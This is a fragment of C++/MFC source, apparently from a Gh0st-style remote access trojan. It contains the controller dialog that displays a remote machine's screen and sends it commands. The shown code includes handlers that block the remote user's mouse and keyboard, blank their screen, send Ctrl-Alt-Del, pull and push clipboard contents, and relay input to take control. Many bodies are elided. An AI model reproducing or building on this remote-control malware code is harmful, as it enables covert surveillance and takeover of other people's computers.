...
IMPLEMENT_DYNAMIC(COLDSCREENSPY, CDialog)

COLDSCREENSPY::COLDSCREENSPY(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(IDD_OLDSCREENSPY, pParent)
{
...
COLDSCREENSPY::~COLDSCREENSPY()
{
}

void COLDSCREENSPY::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(COLDSCREENSPY, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_SIZE()
	ON_WM_CLOSE()
...
void COLDSCREENSPY::OnClose()
{
	...
	::ReleaseDC(m_hWnd, m_hDC);//函数释放设备上下文环境（DC）供其他应用程序使用。
	DeleteObject(m_hFullBitmap);//该函数删除一个逻辑笔、画笔、字体、位图、区域或者调色板，释放所有与该对象有关的系统资源，在对象被删除之后，指定的句柄也就失效了。
...
void COLDSCREENSPY::OnReceiveComplete()
{
	m_nCount++;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN1:
		DrawFirstScreen();
		break;
	case TOKEN_NEXTSCREEN1:
		if (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1] == ALGORITHM_SCAN)
			DrawNextScreenRect();
		else
			DrawNextScreenDiff();
		break;
	case TOKEN_OLDBITMAPINFO:
		ResetScreen();
		break;
	case TOKEN_CLIPBOARD_TEXT1:
...
bool COLDSCREENSPY::SaveSnapshot()
{
...
void COLDSCREENSPY::SendResetScreen(int	nBitCount)
{
	m_nBitCount = nBitCount;

	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_RESET1;
	bBuff[1] = m_nBitCount;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}
void COLDSCREENSPY::SendResetAlgorithm(UINT nAlgorithm)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_ALGORITHM_RESET1;
	bBuff[1] = nAlgorithm;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}

BOOL COLDSCREENSPY::OnInitDialog()
{
	...
	if (pSysMenu != NULL)
	{
		...
		pSysMenu->AppendMenu(MF_STRING, IDM_QuickenScreen, _T("AERO特效(&S)"));
		...
		//		pSysMenu->CheckMenuRadioItem(IDM_DEEP_4_GRAY, IDM_DEEP_32, IDM_DEEP_4_GRAY, MF_BYCOMMAND);//默认选4位灰度
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_GRAY, MF_BYCOMMAND);//默认选1位黑白
	}
...
void COLDSCREENSPY::ResetScreen()
{
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	if (m_lpbmi != NULL)
	{
...
void COLDSCREENSPY::DrawFirstScreen()
{
	m_bIsFirst = false;
...
void COLDSCREENSPY::DrawNextScreenDiff()
{
...
void COLDSCREENSPY::DrawNextScreenRect()
{
...
void COLDSCREENSPY::OnSize(UINT nType, int cx, int cy)
{
...
void COLDSCREENSPY::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_QuickenScreen: // 开启加速
	{
		bool m_isquicken = pSysMenu->GetMenuState(IDM_QuickenScreen, MF_BYCOMMAND) & MF_CHECKED;
		pSysMenu->CheckMenuItem(IDM_QuickenScreen, m_isquicken ? MF_UNCHECKED : MF_CHECKED);
		BYTE	bToken = COMMAND_WIN7BASIC1;
	...
	{
		BYTE	bToken = COMMAND_SCREEN_CTRL_ALT_DEL1;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	...
	case IDM_BLOCK_INPUT: // 锁定服务端鼠标和键盘
	{
		...
		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_BLOCK_INPUT1;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_BLANK_SCREEN: // 服务端黑屏
	{
		...
		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_BLANK1;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_CAPTURE_LAYER: // 捕捉层
	{
		...
		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_CAPTURE_LAYER1;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	...
	{
		BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD1;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
...
LRESULT	COLDSCREENSPY::OnGetMiniMaxInfo(WPARAM wParam, LPARAM lparam)
{
	// 如果m_MMI已经被赋值
...
void COLDSCREENSPY::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
...
BOOL COLDSCREENSPY::PreTranslateMessage(MSG* pMsg)
{
...
void COLDSCREENSPY::PostNcDestroy()
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
...
void COLDSCREENSPY::SendCommand(MSG* pMsg)
{
	if (!m_bIsCtrl)
		return;

	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL1;
	memcpy(lpData + 1, pMsg, sizeof(MSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);

	delete[] lpData;
}
void COLDSCREENSPY::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: Add your message handler code here and/or call default
...
void COLDSCREENSPY::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: Add your message handler code here and/or call default
	SCROLLINFO si;
	int	i;
...
void COLDSCREENSPY::UpdateLocalClipboard(char* buf, int len)
{
...
void COLDSCREENSPY::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	...
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD1;
